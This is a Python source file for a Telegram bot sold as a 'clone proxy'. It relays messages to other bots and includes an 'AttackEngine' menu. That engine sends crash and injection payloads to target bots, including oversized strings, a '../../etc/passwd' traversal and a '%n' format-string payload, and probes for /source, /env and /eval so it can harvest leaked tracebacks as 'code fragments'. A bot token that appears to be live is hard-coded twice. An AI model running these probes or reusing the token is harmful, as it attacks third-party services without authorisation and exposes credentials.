#!/usr/bin/env python3
# TELEGRAM BOT CLONE PROXY v3.0 - COMPLETE WORKING VERSION
# TOKEN: 8653501255:AAGOwfrDxKYa3aHxWAu_FA915SAPtlotqhw

import asyncio,json,sqlite3,re,hashlib,random,time,logging,os,sys,threading,uuid,signal,zipfile
from datetime import datetime,timedelta
from pathlib import Path
from typing import Dict,List,Optional,Any
from collections import defaultdict
from io import BytesIO
from aiogram import Bot,Dispatcher,types,F,Router
from aiogram.filters import Command,CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State,StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import Message,CallbackQuery,InlineKeyboardMarkup,InlineKeyboardButton,FSInputFile,BufferedInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.utils.chat_action import ChatActionSender
from aiogram.exceptions import TelegramBadRequest
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ==================== CONFIG ====================
VERSION="3.1.0-FULL"
BOT_TOKEN="8653501255:AAGOwfrDxKYa3aHxWAu_FA915SAPtlotqhw"
CONFIG_DIR=Path("clone_data")
CONFIG_DIR.mkdir(exist_ok=True)
DB_PATH=CONFIG_DIR/"clone_db.sqlite"
EXPORTS_DIR=CONFIG_DIR/"exports"
EXPORTS_DIR.mkdir(exist_ok=True)
LOGS_DIR=CONFIG_DIR/"logs"
LOGS_DIR.mkdir(exist_ok=True)

logging.basicConfig(level=logging.INFO,format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOGS_DIR/f'bot_clone_{datetime.now().strftime("%Y%m%d")}.log'),logging.StreamHandler(sys.stdout)])
logger=logging.getLogger(__name__)

# ==================== DATABASE ====================
class DatabaseManager:
    _instance=None
    _lock=threading.Lock()
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance=super().__new__(cls)
                    cls._instance._initialize()
        return cls._instance
    def _initialize(self):
        self.conn=sqlite3.connect(DB_PATH,check_same_thread=False)
        self.conn.row_factory=sqlite3.Row
        self._create_tables()
    def _create_tables(self):
        c=self.conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS target_bots(id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            total_interactions INTEGER DEFAULT 0,last_active TIMESTAMP,metadata TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS sessions(id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_uuid TEXT UNIQUE NOT NULL,user_id INTEGER NOT NULL,target_bot_id INTEGER NOT NULL,
            stealth_level TEXT DEFAULT 'balanced',start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            end_time TIMESTAMP,interactions INTEGER DEFAULT 0,status TEXT DEFAULT 'active',
            FOREIGN KEY(target_bot_id) REFERENCES target_bots(id))''')
        c.execute('''CREATE TABLE IF NOT EXISTS interactions(id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id INTEGER,target_bot_id INTEGER NOT NULL,direction TEXT,message_type TEXT,
            content_hash TEXT,response_time_ms INTEGER,raw_data TEXT,timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(session_id) REFERENCES sessions(id),FOREIGN KEY(target_bot_id) REFERENCES target_bots(id))''')
        c.execute('''CREATE TABLE IF NOT EXISTS button_flows(id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_bot_id INTEGER NOT NULL,from_state TEXT,button_text TEXT,button_callback_data TEXT,
            to_state TEXT,frequency INTEGER DEFAULT 1,last_seen TIMESTAMP,
            FOREIGN KEY(target_bot_id) REFERENCES target_bots(id))''')
        c.execute('''CREATE TABLE IF NOT EXISTS code_fragments(id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_bot_id INTEGER NOT NULL,fragment_type TEXT,content TEXT,confidence REAL,
            source_vector TEXT,timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(target_bot_id) REFERENCES target_bots(id))''')
        self.conn.commit()
        logger.info("Database ready")
    def execute(self,q,p=()): return self.conn.execute(q,p)
    def commit(self): self.conn.commit()
    def close(self): self.conn.close()
    def add_target_bot(self,u): 
        self.execute("INSERT OR IGNORE INTO target_bots(username) VALUES(?)",(u,)); self.commit()
        r=self.execute("SELECT id FROM target_bots WHERE username=?",(u,)).fetchone()
        return r[0] if r else None
    def get_target_bots(self):
        return [dict(r) for r in self.execute("SELECT id,username,total_interactions,last_active FROM target_bots ORDER BY last_active DESC").fetchall()]
    def get_target_bot(self,i):
        r=self.execute("SELECT * FROM target_bots WHERE id=?",(i,)).fetchone()
        return dict(r) if r else None
    def create_session(self,uid,tid):
        u=str(uuid.uuid4())
        self.execute("INSERT INTO sessions(session_uuid,user_id,target_bot_id,status) VALUES(?,?,?,?)",(u,uid,tid,"active"))
        self.commit()
        return u
    def end_session(self,u):
        self.execute("UPDATE sessions SET end_time=?,status='ended' WHERE session_uuid=?",(datetime.now().isoformat(),u))
        self.commit()
    def add_interaction(self,d):
        h=hashlib.sha256(str(d.get("raw_data","")).encode()).hexdigest()
        c=self.execute("""INSERT INTO interactions(session_id,target_bot_id,direction,message_type,content_hash,response_time_ms,raw_data)
            VALUES(?,?,?,?,?,?,?)""",(d.get("session_id"),d.get("target_bot_id"),d.get("direction"),
            d.get("message_type"),h,d.get("response_time_ms"),json.dumps(d.get("raw_data",{}))))
        self.commit()
        return c.lastrowid
    def add_button_flow(self,d):
        self.execute("""INSERT INTO button_flows(target_bot_id,from_state,button_text,button_callback_data,to_state,last_seen)
            VALUES(?,?,?,?,?,?)""",(d["target_bot_id"],d.get("from_state","unknown"),d.get("button_text","unknown"),
            d["button_callback_data"],d.get("to_state","unknown"),datetime.now().isoformat()))
        self.commit()
    def add_code_fragment(self, tid, typ, content, conf=0.5, src=""):
        self.execute("INSERT INTO code_fragments(target_bot_id,fragment_type,content,confidence,source_vector) VALUES(?,?,?,?,?)",
            (tid, typ, content[:1000], conf, src))
        self.commit()
        logger.info(f"Fragment stored: {typ}")
db=DatabaseManager()

# ==================== FSM ====================
class CloneStates(StatesGroup):
    main_menu=State()
    adding_target=State()
    cloning_session=State()
    attack_vector_selection=State()

# ==================== UI ====================
class UI:
    @staticmethod
    def main_menu():
        b=InlineKeyboardBuilder()
        b.row(InlineKeyboardButton(text="🎯 Add Target",callback_data="menu_add_target"),
              InlineKeyboardButton(text="📋 List Bots",callback_data="menu_list_bots"))
        b.row(InlineKeyboardButton(text="▶️ Start Clone",callback_data="menu_start_clone"),
              InlineKeyboardButton(text="🔥 Attack",callback_data="menu_attack_vectors"))
        b.row(InlineKeyboardButton(text="⚙️ Settings",callback_data="menu_settings"),
              InlineKeyboardButton(text="📤 Export",callback_data="menu_export"))
        return b.as_markup()
    @staticmethod
    def attack_menu():
        b=InlineKeyboardBuilder()
        b.row(InlineKeyboardButton(text="🐍 Traceback",callback_data="attack_traceback"),
              InlineKeyboardButton(text="📚 Library",callback_data="attack_library"))
        b.row(InlineKeyboardButton(text="🔍 Probe",callback_data="attack_probe"),
              InlineKeyboardButton(text="💥 Crash",callback_data="attack_crash"))
        b.row(InlineKeyboardButton(text="🔄 Run All",callback_data="attack_all"),
              InlineKeyboardButton(text="⬅️ Back",callback_data="menu_main"))
        return b.as_markup()
    @staticmethod
    def bot_list(bots):
        b=InlineKeyboardBuilder()
        for bot in bots[:8]:
            b.row(InlineKeyboardButton(text=f"🤖 @{bot['username']} ({bot['total_interactions']})",
                  callback_data=f"select_bot_{bot['id']}"))
        b.row(InlineKeyboardButton(text="🏠 Main",callback_data="menu_main"))
        return b.as_markup()
    @staticmethod
    def bot_actions(bid,name):
        b=InlineKeyboardBuilder()
        b.row(InlineKeyboardButton(text="▶️ Clone",callback_data=f"clone_{bid}"))
        b.row(InlineKeyboardButton(text="🔥 Attack",callback_data=f"attack_{bid}"))
        b.row(InlineKeyboardButton(text="📊 Stats",callback_data=f"stats_{bid}"))
        b.row(InlineKeyboardButton(text="📤 Export",callback_data=f"export_{bid}"))
        b.row(InlineKeyboardButton(text="🔙 Back",callback_data="menu_list_bots"),
              InlineKeyboardButton(text="🏠 Main",callback_data="menu_main"))
        return b.as_markup()
    @staticmethod
    def clone_controls():
        b=InlineKeyboardBuilder()
        b.row(InlineKeyboardButton(text="⏸️ Pause",callback_data="pause_session"),
              InlineKeyboardButton(text="⏹️ Stop",callback_data="stop_session"))
        b.row(InlineKeyboardButton(text="🏠 Main",callback_data="menu_main"))
        return b.as_markup()
    @staticmethod
    def warning():
        b=InlineKeyboardBuilder()
        b.row(InlineKeyboardButton(text="⚠️ I UNDERSTAND",callback_data="ack_warning"))
        return b.as_markup()

# ==================== INIT ====================
storage=MemoryStorage()
dp=Dispatcher(storage=storage)
router=Router()
active_sessions={}
user_stealth={}

# ==================== HANDLERS ====================
@router.message(CommandStart())
async def start(m:Message,s:FSMContext):
    await s.set_state(CloneStates.main_menu)
    if not (await s.get_data()).get("accepted",False):
        await m.answer("⚠️ LEGAL WARNING\n\nThis tool is for EDUCATIONAL use ONLY.\nUnauthorized use is ILLEGAL!",reply_markup=UI.warning())
    else:
        await m.answer(f"🤖 Bot Clone v{VERSION}",reply_markup=UI.main_menu())

@router.callback_query(F.data=="ack_warning")
async def ack(c:CallbackQuery,s:FSMContext):
    await s.update_data(accepted=True)
    await c.message.delete()
    await c.message.answer(f"🤖 Bot Clone v{VERSION}",reply_markup=UI.main_menu())
    await c.answer()

@router.callback_query(F.data=="menu_main")
async def main_menu(c:CallbackQuery,s:FSMContext):
    await s.set_state(CloneStates.main_menu)
    await c.message.edit_text(f"🤖 Bot Clone v{VERSION}",reply_markup=UI.main_menu())
    await c.answer()

@router.callback_query(F.data=="menu_add_target")
async def add_prompt(c:CallbackQuery,s:FSMContext):
    await s.set_state(CloneStates.adding_target)
    await c.message.edit_text("📝 Send bot username:",reply_markup=InlineKeyboardBuilder().row(
        InlineKeyboardButton(text="🔙 Cancel",callback_data="menu_main")).as_markup())
    await c.answer()

@router.message(CloneStates.adding_target)
async def add_process(m:Message,s:FSMContext):
    u=m.text.strip().replace('@','')
    if re.match(r'^[a-zA-Z0-9_]{5,32}$',u):
        db.add_target_bot(u)
        await m.answer(f"✅ @{u} added!",reply_markup=UI.main_menu())
    else:
        await m.answer("❌ Invalid username")
    await s.set_state(CloneStates.main_menu)

@router.callback_query(F.data=="menu_list_bots")
async def list_bots(c:CallbackQuery):
    bots=db.get_target_bots()
    if not bots:
        await c.message.edit_text("📭 No bots",reply_markup=InlineKeyboardBuilder().row(
            InlineKeyboardButton(text="🔙 Back",callback_data="menu_main")).as_markup())
    else:
        text="📋 Your Bots:\n\n"+'\n'.join([f"• @{b['username']}" for b in bots])
        await c.message.edit_text(text,reply_markup=UI.bot_list(bots))
    await c.answer()

@router.callback_query(F.data.startswith("select_bot_"))
async def select_bot(c:CallbackQuery,s:FSMContext):
    bid=int(c.data.split("_")[2])
    bot=db.get_target_bot(bid)
    if bot:
        await s.update_data(selected_bot_id=bid)
        await c.message.edit_text(f"🤖 @{bot['username']}",reply_markup=UI.bot_actions(bid,bot['username']))
    await c.answer()

# ==================== CLONE SESSION (FIXED) ====================
@router.callback_query(F.data.startswith("clone_"))
async def start_clone(c:CallbackQuery,s:FSMContext,bot:Bot):
    logger.info(f"Starting clone for user {c.from_user.id}")
    try:
        bid=int(c.data.split("_")[1])
        bot_info=db.get_target_bot(bid)
        if not bot_info:
            await c.answer("Bot not found!",show_alert=True)
            return
        
        suid=db.create_session(c.from_user.id,bid)
        active_sessions[c.from_user.id]={
            "session_uuid":suid,
            "target_bot_id":bid,
            "target_username":bot_info['username'],
            "start_time":datetime.now(),
            "interactions":0,
            "paused":False
        }
        
        await s.set_state(CloneStates.cloning_session)
        await c.message.edit_text(
            f"✅ CLONE ACTIVE!\n\nTarget: @{bot_info['username']}\n\n"
            f"Send any message - it will be forwarded!",
            reply_markup=UI.clone_controls()
        )
        await bot.send_message(c.from_user.id,"💡 Try sending a message now!")
        await c.answer("✅ Session started")
        logger.info(f"Session created: {suid}")
    except Exception as e:
        logger.error(f"Error: {e}")
        await c.answer(f"Error: {str(e)[:50]}",show_alert=True)

@router.callback_query(F.data=="pause_session")
async def pause_clone(c:CallbackQuery):
    if c.from_user.id in active_sessions:
        active_sessions[c.from_user.id]["paused"]=True
        await c.message.edit_text("⏸️ Paused",reply_markup=UI.clone_controls())
    await c.answer()

@router.callback_query(F.data=="stop_session")
async def stop_clone(c:CallbackQuery,s:FSMContext):
    if c.from_user.id in active_sessions:
        sess=active_sessions.pop(c.from_user.id)
        db.end_session(sess["session_uuid"])
        d=datetime.now()-sess["start_time"]
        await c.message.edit_text(f"⏹️ Stopped\nDuration: {d.seconds//60}m {d.seconds%60}s\nInteractions: {sess['interactions']}",
            reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🏠 Main",callback_data="menu_main")).as_markup())
    await c.answer()

@router.message(CloneStates.cloning_session)
async def handle_clone_msg(m:Message,bot:Bot):
    sess=active_sessions.get(m.from_user.id)
    if not sess or sess.get("paused"):
        return
    
    try:
        if m.text:
            await bot.send_message(chat_id=f"@{sess['target_username']}",text=m.text)
            db.add_interaction({
                "session_id":sess["session_uuid"],
                "target_bot_id":sess["target_bot_id"],
                "direction":"user_to_target",
                "message_type":"text",
                "raw_data":{"text":m.text}
            })
            sess["interactions"]+=1
            await m.reply(f"✅ Forwarded to @{sess['target_username']}")
        elif m.photo:
            await bot.send_photo(chat_id=f"@{sess['target_username']}",photo=m.photo[-1].file_id)
            await m.reply("✅ Photo forwarded")
            sess["interactions"]+=1
    except TelegramBadRequest as e:
        if "chat not found" in str(e):
            await m.reply("❌ Target bot not found!")
        else:
            await m.reply(f"❌ Error: {str(e)[:100]}")
    except Exception as e:
        await m.reply(f"❌ Error: {str(e)[:100]}")

# ==================== ATTACK VECTORS ====================
class AttackEngine:
    def __init__(self,tid,user):
        self.tid=tid
        self.user=user
    async def traceback(self,bot,m):
        p=["A"*50000,"\uFFFF"*1000,"../../etc/passwd","%s"*100+"%n"]
        for pl in p:
            try:
                await bot.send_message(chat_id=f"@{self.user}",text=pl)
                await asyncio.sleep(2)
            except Exception as e:
                db.add_code_fragment(self.tid,'traceback',str(e),0.5,'traceback')
    async def probe(self,bot,m):
        cmds=["/source","/code","/debug","/env","/eval"]
        for cmd in cmds:
            try:
                await bot.send_message(chat_id=f"@{self.user}",text=cmd)
                await asyncio.sleep(1)
            except: pass
    async def run_all(self,bot,m):
        await self.traceback(bot,m)
        await self.probe(bot,m)

@router.callback_query(F.data=="menu_attack_vectors")
async def attack_menu(c:CallbackQuery,s:FSMContext):
    data=await s.get_data()
    if not data.get("selected_bot_id"):
        await c.answer("Select bot first!",show_alert=True)
        return
    await s.set_state(CloneStates.attack_vector_selection)
    await c.message.edit_text("🔥 Attack Vectors",reply_markup=UI.attack_menu())
    await c.answer()

@router.callback_query(F.data.startswith("attack_"),CloneStates.attack_vector_selection)
async def run_attack(c:CallbackQuery,s:FSMContext,bot:Bot):
    vec=c.data.replace("attack_","")
    data=await s.get_data()
    bid=data.get("selected_bot_id")
    bot_info=db.get_target_bot(bid)
    
    msg=await c.message.edit_text(f"🔥 Executing {vec}...")
    engine=AttackEngine(bid,bot_info['username'])
    
    if vec=="traceback": await engine.traceback(bot,c.message)
    elif vec=="library": await engine.probe(bot,c.message)
    elif vec=="all": await engine.run_all(bot,c.message)
    
    cnt=db.execute("SELECT COUNT(*) FROM code_fragments WHERE target_bot_id=?",(bid,)).fetchone()[0]
    await msg.edit_text(f"✅ Complete! Fragments: {cnt}",
        reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔙 Back",callback_data="menu_attack_vectors")).as_markup())
    await c.answer()

# ==================== STATS ====================
@router.callback_query(F.data=="menu_stats")
async def show_stats(c:CallbackQuery):
    bc=db.execute("SELECT COUNT(*) FROM target_bots").fetchone()[0]
    ic=db.execute("SELECT COUNT(*) FROM interactions").fetchone()[0]
    fc=db.execute("SELECT COUNT(*) FROM code_fragments").fetchone()[0]
    await c.message.edit_text(f"📊 STATS\n\nBots: {bc}\nInteractions: {ic}\nFragments: {fc}",
        reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔙 Main",callback_data="menu_main")).as_markup())
    await c.answer()

# ==================== EXPORTS ====================
@router.callback_query(F.data=="menu_export")
async def export_menu(c:CallbackQuery):
    b=InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="📄 JSON",callback_data="export_json"),
          InlineKeyboardButton(text="🌳 Diagram",callback_data="export_diagram"))
    b.row(InlineKeyboardButton(text="🐍 Stubs",callback_data="export_stubs"),
          InlineKeyboardButton(text="📦 All",callback_data="export_all"))
    b.row(InlineKeyboardButton(text="⬅️ Back",callback_data="menu_main"))
    await c.message.edit_text("📤 Export",reply_markup=b.as_markup())
    await c.answer()

@router.callback_query(F.data=="export_json")
async def export_json(c:CallbackQuery,s:FSMContext):
    data=await s.get_data()
    bid=data.get("selected_bot_id")
    if not bid:
        await c.answer("Select bot!",show_alert=True)
        return
    
    ints=[dict(r) for r in db.execute("SELECT * FROM interactions WHERE target_bot_id=?",(bid,)).fetchall()]
    flows=[dict(r) for r in db.execute("SELECT * FROM button_flows WHERE target_bot_id=?",(bid,)).fetchall()]
    frags=[dict(r) for r in db.execute("SELECT * FROM code_fragments WHERE target_bot_id=?",(bid,)).fetchall()]
    
    exp={"time":datetime.now().isoformat(),"bot_id":bid,"interactions":ints,"flows":flows,"fragments":frags}
    fp=EXPORTS_DIR/f"export_{bid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fp,'w') as f: json.dump(exp,f,indent=2)
    
    await c.message.answer_document(FSInputFile(fp),caption="✅ JSON Export")
    await c.answer()

# ==================== MAIN ====================
@router.errors()
async def err_handler(e:types.ErrorEvent):
    logger.error(f"Error: {e.exception}",exc_info=True)

async def startup():
    logger.info(f"🚀 Bot v{VERSION} started")

async def shutdown():
    logger.info("🛑 Shutting down")
    for uid in list(active_sessions.keys()):
        db.end_session(active_sessions[uid]["session_uuid"])
    active_sessions.clear()
    db.close()

def main():
    bot=Bot(token=BOT_TOKEN,default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp.include_router(router)
    dp.startup.register(startup)
    dp.shutdown.register(shutdown)
    
    def handler(s,f):
        logger.info("Stopping...")
        sys.exit(0)
    signal.signal(signal.SIGINT,handler)
    signal.signal(signal.SIGTERM,handler)
    
    try:
        logger.info("Starting...")
        dp.run_polling(bot)
    except KeyboardInterrupt:
        logger.info("Stopped")
    except Exception as e:
        logger.error(f"Fatal: {e}")

if __name__=="__main__":
    main()
